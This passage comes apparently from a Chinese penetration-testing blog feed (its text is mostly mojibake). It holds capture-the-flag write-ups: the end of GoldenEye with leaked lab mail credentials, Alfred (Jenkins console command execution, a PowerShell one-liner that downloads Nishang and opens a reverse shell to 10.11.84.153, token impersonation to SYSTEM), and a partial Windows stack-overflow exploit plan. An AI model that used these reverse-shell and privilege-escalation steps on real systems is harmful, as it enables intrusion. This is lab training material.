ï¼Œæˆ‘ä»¬å°±ä¼šè¿›å…¥æœ€åé˜¶æ®µ....PS - ä¿æŒå®‰å…¨ï¼Œå¦åˆ™æˆ‘ä»¬å°†å—åˆ°å¨èƒã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ°è¿™é‡Œå¡ä½äº†ï¼Œçœ‹äº†wpå‘ç°è¿˜å¯ä»¥çˆ†å‡ºnatalyaçš„è´¦å¯†ï¼š<code>natalya:bird</code>ï¼ˆæ²‰é»˜â€¦ï¼‰</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">+OK 631 octetsReturn-Path: &lt;root@ubuntu>X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id D5EDA454B1        for &lt;natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)From: root@ubuntuNatalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus..å¨œå¡”è‰äºšï¼Œè¯·ä½ ä¸è¦å†ç ´è§£é²é‡Œæ–¯çš„å¯†ç äº†ã€‚å¦å¤–ï¼Œä½ æ˜¯ GNO çš„åŸ¹è®­ä¸»ç®¡ã€‚ä¸€æ—¦æœ‰å­¦ç”Ÿè¢«æŒ‡å®šç»™ä½ ï¼Œæˆ‘ä¼šç»™ä½ å‘ç”µå­é‚®ä»¶ã€‚å¦å¤–ï¼Œè¦å°å¿ƒå¯èƒ½çš„ç½‘ç»œæ¼æ´ã€‚æˆ‘ä»¬å¾—åˆ°æƒ…æŠ¥ï¼Œä¸€ä¸ªåä¸º Janus çš„çŠ¯ç½ªé›†å›¢æ­£åœ¨è¿½æ• GoldenEyeã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">retr 2+OK 1048 octetsReturn-Path: &lt;root@ubuntu>X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from root (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id 17C96454B1        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)Message-Id: &lt;20180425031956.17C96454B1@ubuntu>Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)From: root@ubuntuOk Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)Ok, user creds are:username: xeniapassword: RCP90rulez!Boris verified her as a valid contractor so just create the account ok?And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir**Make sure to edit your host file since you usually work remote off-network....Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.å¥½çš„ï¼ŒNatalynï¼Œæˆ‘æœ‰ä¸€ä¸ªæ–°å­¦ç”Ÿè¦æ•™ä½ ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªæ–°ç³»ç»Ÿï¼Œå¦‚æœæ‚¨å‘ç°ä»»ä½•é…ç½®é—®é¢˜ï¼Œè¯·å‘Šè¯‰æˆ‘æˆ– borisï¼Œå°¤å…¶æ˜¯ä¸å®‰å…¨ç›¸å…³çš„é—®é¢˜...å³ä½¿ä¸æ˜¯ï¼Œåªéœ€ä»¥â€œå®‰å…¨â€çš„åä¹‰è¾“å…¥...å®ƒå°±ä¼šæ¯«ä¸è´¹åŠ›åœ°å‡çº§å˜æ›´å• :)å¥½çš„ï¼Œç”¨æˆ·å‡­æ®æ˜¯ï¼šç”¨æˆ·åï¼šxeniaå¯†ç ï¼šRCP90rulez!Boris å·²éªŒè¯å¥¹æ˜¯ä¸€åæœ‰æ•ˆçš„æ‰¿åŒ…å•†ï¼Œå› æ­¤åªéœ€åˆ›å»ºå¸æˆ·å³å¯ï¼Ÿå¦‚æœæ‚¨æ²¡æœ‰å†…éƒ¨åŸŸä¸Šçš„ URLï¼šsevernaya-station.com/gnocertdir**è¯·ç¡®ä¿ç¼–è¾‘æ‚¨çš„ä¸»æœºæ–‡ä»¶ï¼Œå› ä¸ºæ‚¨é€šå¸¸åœ¨ç½‘ç»œå¤–è¿œç¨‹å·¥ä½œ....ç”±äºæ‚¨æ˜¯ Linux ç”¨æˆ·ï¼Œåªéœ€å°†æ­¤æœåŠ¡å™¨ IP æŒ‡å‘ /etc/hosts ä¸­çš„ severnaya-station.comã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè¦æ±‚æˆ‘ä»¬é…ç½® hosts æ–‡ä»¶ï¼Œæ·»åŠ ä¸€æ¡åŸŸåè§£æ severnaya-station.com<br><img src="/Red_FILE/a52338b86fe7172bc200fc063c1e28a3_MD5.jpeg"></p><p>ç„¶åè®¿é—®severnaya-station.com&#x2F;gnocertdir<br><img src="/Red_FILE/026b36e98242bd2302d1f450402b5503_MD5.jpeg"></p><p>ç”¨æ‹¿åˆ°çš„è´¦å¯†<code>xenia:RCP90rulez!</code>ç™»å½•è¿›å»<br><img src="/Red_FILE/f8a8185f8e9a190ce33c2309d7425318_MD5.jpeg"><br><img src="/Red_FILE/54b638b32771b907962fcc3227275290_MD5.jpeg"><br>æ˜¯ä¸€ä¸ªLMSï¼ˆå­¦ä¹ ç®¡ç†ç³»ç»Ÿï¼‰ï¼Œphp5.5.9</p><p>åœ¨é‚®ç®±é‡Œæ‰¾åˆ°ä¸€å°é‚®ä»¶ï¼Œå‘é€è€…æ˜¯ Dr Doak</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">09:24 PM: Greetings Xenia,As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.My email username is...doakThank you,Cheers,Dr. Doak "The Doctor"Training Scientist - Sr Level Training Operating SupervisorGoldenEye Operations Center SectorLevel 14 - NO2 - id:998623-1334Campus 4, Building 57, Floor -8, Sector 6, cube 1,007Phone 555-193-826Cell 555-836-0944Office 555-846-9811Personal 555-826-9923Email: doak@Please Recycle before you print, Stay Green aka save the company money!"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy"You miss 100% of the shots you don't shoot at" - Wayne G.THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.09:24 PMï¼šæ‚¨å¥½ï¼ŒXeniaï¼Œä½œä¸ºæˆ‘ä»¬ GoldenEye åŸ¹è®­çš„æ–°æ‰¿åŒ…å•†ï¼Œæˆ‘æ¬¢è¿æ‚¨ã€‚ä¸€æ—¦æ‚¨çš„å¸æˆ·å®Œæˆï¼Œæ‚¨çš„ä»ªè¡¨æ¿ä¸Šå°±ä¼šå‡ºç°æ›´å¤šè¯¾ç¨‹ã€‚å¦‚æœæ‚¨æœ‰ä»»ä½•é—®é¢˜ï¼Œè¯·é€šè¿‡ç”µå­é‚®ä»¶ç»™æˆ‘ç•™è¨€ï¼Œè€Œä¸æ˜¯åœ¨è¿™é‡Œã€‚æˆ‘çš„ç”µå­é‚®ä»¶ç”¨æˆ·åæ˜¯...doakè°¢è°¢ï¼Œå¹²æ¯ï¼ŒDoak åšå£«â€œåšå£«â€åŸ¹è®­ç§‘å­¦å®¶ - é«˜çº§åŸ¹è®­è¿è¥ä¸»ç®¡GoldenEye è¿è¥ä¸­å¿ƒéƒ¨é—¨14 å±‚ - NO2 - id:998623-1334å›­åŒº 4ï¼Œ57 å·æ¥¼ï¼Œç¬¬ 6 åŒºç¬¬ 8 å±‚ï¼Œç«‹æ–¹ä½“ 1,007ç”µè¯ 555-193-826æ‰‹æœº 555-836-0944åŠå…¬å®¤ 555-846-9811ä¸ªäºº 555-826-9923ç”µå­é‚®ä»¶ï¼šdoak@è¯·åœ¨æ‰“å°å‰è¿›è¡Œå›æ”¶ï¼Œä¿æŒç¯ä¿ï¼Œå³ä¸ºå…¬å¸èŠ‚çœèµ„é‡‘ï¼â€œæœ‰è¿™æ ·ä¸€ç§äº‹ï¼Œå«åšâ€˜å¤©å“ªï¼Œå¤©å“ªï¼Œå¤©å“ªâ€™ã€‚é—®é—®æŸ¥ç†Â·å¸ƒæœ—å°±çŸ¥é“äº†â€ - someguyâ€œä½ æ²¡æœ‰å°„å‡»çš„çƒ 100% éƒ½ä¼šæ‰“ä¸ä¸­â€ - Wayne G.è¿™æ˜¯ä¸€æ¡å®‰å…¨æ¶ˆæ¯ï¼Œé™¤éå¦æœ‰è¯´æ˜ï¼Œå¦åˆ™è¯·å‹¿å‘é€ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰¾äº†å¥½ä¸€ä¼šéƒ½æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œçœ‹ä¸‹æœ‰æ²¡æœ‰å†å²CVEï¼Œæ˜¯moodle 2.2.3<br><img src="/Red_FILE/0c47223ce8a0fcfa842ddfdc5679f0e4_MD5.jpeg"></p><p>wpä¸­adminå¯†ç çš„è·å¾—é€”å¾„ä¹Ÿæ¯”è¾ƒåé—¨</p><p>2018å¹´çš„è€é¶æœºï¼Œå‚è€ƒæ„ä¹‰ä¸æ˜¯å¾ˆå¤§ï¼Œæš‚æ—¶å°±åšåˆ°è¿™å§</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>æˆ‘å­¦ä¹ åˆ°äº†pop3é‚®ä»¶ç³»ç»Ÿçš„ç™»å½•å’Œçˆ†ç ´æ–¹æ³•</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alfred</title>
      <link href="/2024/07/10/Alfred/"/>
      <url>/2024/07/10/Alfred/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p>å¸¸è§„æ‰«ç«¯å£</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">8080803389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>80ç«¯å£æ˜¯ä¸ªé™æ€é¡µé¢<br><img src="/Red_FILE/c7a4f24df2493fc7020ca80e71b8565b_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">æ„¿é€è€…å®‰æ¯ï¼Œå¸ƒé²æ–¯Â·éŸ¦æ©ã€‚ å°†ææ¬¾å‘é€è‡³ alfred@wayneenterprises.com å°†å¾—åˆ°æˆ‘ä»¬çš„è¡·å¿ƒæ„Ÿè°¢<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨8080ç«¯å£æœ‰ä¸ªç™»å½•ç•Œé¢<br><img src="/Red_FILE/bc60287cf8ee6287175ab6dcedba8757_MD5.jpeg"></p><p>admin:adminç›´æ¥è¿›æ¥äº†<br><img src="/Red_FILE/5e020b9f9ae6314b3c2b805a9f50a7bd_MD5.jpeg"></p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>ç½‘ç«™æ˜¯ä¸€ä¸ªé¡¹ç›®ç®¡ç†ç•Œé¢ï¼ŒåŠŸèƒ½æ¯”è¾ƒå¤æ‚ï¼Œæ¢ç´¢äº†å¥½ä¸€ä¼š</p><p>è¿™æ˜¯ä¸€ä¸ªx86çš„ win7 ç³»ç»Ÿ<br><img src="/Red_FILE/60aeeea2adbe5c72beef763344a10989_MD5.jpeg"></p><p>æ—¥å¿—é‡Œç–‘ä¼¼ç½‘ç«™ç›®å½• C:\Program Files (x86)\Jenkins\war<br><img src="/Red_FILE/beec766e669c31d571f3e0c0cba6bab7_MD5.jpeg"></p><p>ç»è¿‡æˆ‘çš„æ¢ç´¢ï¼Œæˆ‘å‘ç°åœ¨ computer&#x2F;(master)&#x2F;script å¤„å­˜åœ¨ä¸€ä¸ªjavaæ§åˆ¶å°ï¼›å‘½ä»¤æ ¼å¼ä¸º<code>println &quot;uname -a&quot;.execute().text</code><br><img src="/Red_FILE/6ce4371c18c2ecb82160fc2942ebe8ae_MD5.jpeg"></p><p>å…ˆç¡®å®šä¸€äº›åŸºç¡€ä¿¡æ¯ï¼Œä¸»æœºåä¸º<code>alfred</code>ï¼Œä½¿ç”¨çš„ç”¨æˆ·åä¸º<code>bruce</code>ã€‚<br>systeminfoï¼š<br><img src="/Red_FILE/72c8947f552f8a2012fef47251c60e8f_MD5.jpeg"><br>ifconfigï¼š<br><img src="/Red_FILE/12a12f639b8857c8f3b761d7982ad97b_MD5.jpeg"></p><p>é—®é¢˜æ˜¯å¯æ‰§è¡Œçš„å‘½ä»¤éå¸¸æœ‰é™<br><img src="/Red_FILE/abed24f96043b9246ec7130e6fb57bfb_MD5.jpeg"></p><p>ç½‘ç«™ä½¿ç”¨çš„ ci æ˜¯ Jenkins ï¼Œåœ¨ç½‘ä¸ŠæŸ¥ä¸€æŸ¥å‘ç°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p>åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®<br><img src="/Red_FILE/7ad14519679bb9d0d34e766cc78a960f_MD5.jpeg"><br><img src="/Red_FILE/db1bed528e9b8696713cf1b8c388771a_MD5.jpeg"></p></li><li><p>build é€‰æ‹©éœ€è¦çš„å‘½ä»¤æ ¼å¼<br><img src="/Red_FILE/3ab1903ebc34f38eb3cb1422a2159460_MD5.jpeg"></p></li><li><p>è¾“å…¥å‘½ä»¤ç‚¹ä¿å­˜<br><img src="/Red_FILE/afa6e796d28d9b931f59e5f062d0898c_MD5.jpeg"></p></li><li><p>ç‚¹å‡» build now<br><img src="/Red_FILE/b55ae077a10ed9b842b33c96fb1ed8c3_MD5.jpeg"></p></li></ol><p>æˆ–è€…ç‚¹å‡» configure ä¹Ÿè¡Œ</p><ol start="5"><li>æŸ¥çœ‹è¾“å‡º<br><img src="/Red_FILE/5b0f44f31ac67da2b350626185590462_MD5.jpeg"><br><img src="/Red_FILE/0ac9c82e7f033fafd3f477fb3e061611_MD5.jpeg"><br><img src="/Red_FILE/c40bff898f97de60fe4953cb8a810112_MD5.jpeg"></li></ol><p>æ—¢ç„¶èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œä½¿ç”¨ nishang çš„ PowerShellTcp.ps1 è„šæœ¬æ¥åå¼¹shell</p><blockquote><p><a href="https://github.com/samratashok/nishang">Nishang</a> æ˜¯ä¸€ä¸ªè„šæœ¬å’Œæœ‰æ•ˆè½½è·çš„æ¡†æ¶å’Œé›†åˆï¼Œå®ƒæ”¯æŒä½¿ç”¨ PowerShell è¿›è¡Œæ”»å‡»æ€§å®‰å…¨ã€æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿã€‚</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://10.11.84.153:8888/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Invoke-PowerShellTcp</span> <span class="token operator">-</span>Reverse <span class="token operator">-</span>IPAddress 10<span class="token punctuation">.</span>11<span class="token punctuation">.</span>84<span class="token punctuation">.</span>153 <span class="token operator">-</span>port 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸåå¼¹shell<br><img src="/Red_FILE/2a51fc54b287550969f87870c903cf99_MD5.jpeg"></p><hr><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ msf </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell <span class="token string">"(New-Object System.Net.WebClient).Downloadfile('http://10.11.84.153:8888/ma.exe','ma.exe')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>whoami &#x2F;privï¼Œç”¨æˆ·å…·æœ‰ SeImpersonatePrivilege æƒé™ï¼Œç›´æ¥ä¼ªé€ tokenå³å¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load incognitolist_tokens <span class="token parameter variable">-u</span> impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span> migrate <span class="token parameter variable">-N</span> services.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Red_FILE/d85a9654b42f1bfa891c20a96cad766b_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯2020 easyoverflow</title>
      <link href="/2024/07/09/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%20easyoverflow/"/>
      <url>/2024/07/09/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%20easyoverflow/</url>
      
        <content type="html"><![CDATA[<h1 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h1><p><img src="/EXP_FILE/a15bee592aac18b05e22dcae4e48850f_MD5.jpeg"><br>æ‰“å¼€äº†DEPã€GSã€dynamicbaseã€SEH</p><p>ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œæœ‰ä¸‰æ¬¡æ ˆæº¢å‡ºï¼Œå¹¶é€šè¿‡putsæ‰“å°åˆ°å±å¹•ä¸Š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>  FILE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  FILE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">char</span> DstBuf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-118h] BYREF</span>  v3 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">--</span>v6<span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> DstBuf<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"buffer:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dll ç‰ˆæœ¬æ˜¯ Windows Server 2019</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><ul><li>ç¬¬ä¸€è½®<br>ç¬¬ä¸€æ¬¡å¿…ç„¶æ˜¯è¦æ³„éœ² StackCookie å€¼ï¼Œå¡«å……åˆ° StackCookie å¤„é€šè¿‡puts()è¿å¸¦æ³„éœ²<br>ç¬¬äºŒæ¬¡æ³„éœ²ç¨‹åºåŸºå€ï¼Œå› ä¸ºç¨‹åºæœªè¿”å›ï¼Œæ‰€ä»¥è¦†ç›– StackCookie ä¹Ÿä¸ä¼šcrash</li></ul><p>x64PEä¼ å‚æ˜¯é€šè¿‡<code>rcxã€rdxã€r8ã€r9</code>ï¼Œexeé‡Œçš„gadgetå¤ªå°‘æ— æ³•ROP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>easyoverflow<span class="token operator">></span> python <span class="token punctuation">..</span><span class="token punctuation">\</span>ROPgadget.py <span class="token parameter variable">--binary</span> <span class="token string">'.\StackOverflow.exe'</span> <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x00000001400017ee <span class="token builtin class-name">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000001400010c9 <span class="token builtin class-name">:</span> pop rbx <span class="token punctuation">;</span> ret0x00000001400014ed <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret0x000000014000133d <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> ret0x00000001400014ee <span class="token builtin class-name">:</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret0x00000001400010ca <span class="token builtin class-name">:</span> ret0x0000000140001818 <span class="token builtin class-name">:</span> ret <span class="token number">0</span>0x0000000140001723 <span class="token builtin class-name">:</span> ret 0x83480x0000000140001643 <span class="token builtin class-name">:</span> ret 0xb70f0x0000000140001678 <span class="token builtin class-name">:</span> ret 0xeb280x0000000140001d12 <span class="token builtin class-name">:</span> ret <span class="token number">3</span>Unique gadgets found: <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸‰æ¬¡è¿”å›main()ï¼Œæˆ‘ä»¬æŠŠç›®æ ‡è½¬å‘ ntdll.dll æ¥å¯»æ‰¾å¯ç”¨çš„gadget</p><ul><li><p>ç¬¬äºŒè½®<br>ç¬¬ä¸€æ¬¡ç»§ç»­è¿å¸¦æ³„éœ² StackCookie<br>ç¬¬äºŒæ¬¡ä»ç„¶å¯ä»¥è¿å¸¦æ³„éœ² ntdll.dllï¼Œæ³„éœ²äº†ntdllæˆ‘ä»¬å°±æœ‰äº†å¤§é‡å¯ç”¨çš„gadget<br><img src="/EXP_FILE/969649698b9df3f6b6c76f3367d67426_MD5.jpeg"><br>ç¬¬ä¸‰æ¬¡è‚¯å®šæ˜¯ç»§ç»­å›åˆ°main()ä¸Šå•¦</p></li><li><p>ç¬¬ä¸‰è½®<br>ç¬¬ä¸€æ¬¡ç»§ç»­è¿å¸¦æ³„éœ² StackCookie3<br>ç¬¬äºŒæ¬¡paddings<br>ç¬¬ä¸‰æ¬¡ä½¿ç”¨ ret2dll æ³„éœ² ucrtbase.dllï¼Œå¹¶é€šè¿‡ rbx æ§åˆ¶å¾ªç¯</p></li></ul><p>åªèƒ½æ‰¾åˆ°<code>call puts;</code>ï¼Œå› æ­¤éœ€è¦æ‰¾å…¶ä»–æ–¹å¼æ¥ä½¿ç¨‹åºæ³„éœ²åŸºå€åä»èƒ½åŠ«æŒç¨‹åºæµåˆ° main()ï¼›æˆ‘ä»¬æ³¨æ„åˆ° doâ€¦while å¾ªç¯æ˜¯åˆ¤æ–­ rbx æ¥è¿›è¡Œå¾ªç¯çš„ï¼Œå¦‚æœèƒ½æå‰æ§åˆ¶rbxçš„å€¼å°±èƒ½å®ç°æ— é™å¾ªç¯ï¼š<br><img src="/EXP_FILE/d925857c969e6159a5fe8693b2a2fa3b_MD5.jpeg"></p><p>æ§åˆ¶äº†å¾ªç¯ï¼Œç¬¬å››æ¬¡èµ°system getshellâ€¦æœçœŸå¦‚æ­¤å—ï¼Ÿ</p><p>å¯¹StackCookie3çš„æ ¡éªŒå¤±è´¥ï¼š<br><img src="/EXP_FILE/6e13a500a656e33bfd4cff487f482655_MD5.jpeg"><br>è¿™æ˜¯ç”±äºé€šè¿‡ rbx æ§åˆ¶å¾ªç¯å¯¼è‡´äº† new_rsp ä¸æ³„éœ² StackCookie3 æ—¶çš„ old_rsp ä¸åŒï¼Œ<code>StackCookie3 ^ new_rsp != __security_cookie</code></p><p>æ—¢ç„¶è¦èµ°ret2dllï¼Œrspçš„å˜åŠ¨æ˜¯æ— æ³•é¿å…çš„ï¼Œè¦å¾—åˆ°æ–°çš„ StackCookie å°±éœ€è¦æ³„éœ²æ ˆå€¼å’Œ__security_cookieï¼šæˆ‘ä»¬å¯ä»¥ ret2dll æ³„éœ²__security_cookieï¼Œå†ä¸ StackCookie3 å¼‚æˆ–å¾—åˆ° old_rsp</p><ul><li>ç¬¬ä¸‰è½®æ­£ç¡®æ“ä½œ<br>ç¬¬ä¸€æ¬¡ç»§ç»­è¿å¸¦æ³„éœ² StackCookie3<br>ç¬¬äºŒæ¬¡paddings<br>ç¬¬ä¸‰æ¬¡ä½¿ç”¨ ret2dll æ³„éœ²__security_cookieï¼Œå¹¶é€šè¿‡ rbx æ§åˆ¶å¾ªç¯ï¼Œé€šè¿‡å¼‚æˆ–å¾—åˆ° old_rspï¼Œä»è€Œè®¡ç®—å‡ºä»»æ„rspçš„StackCookie<br>ç¬¬å››æ¬¡ ret2dll æ³„éœ² ucrtbaseï¼Œå¹¶é€šè¿‡ rbx 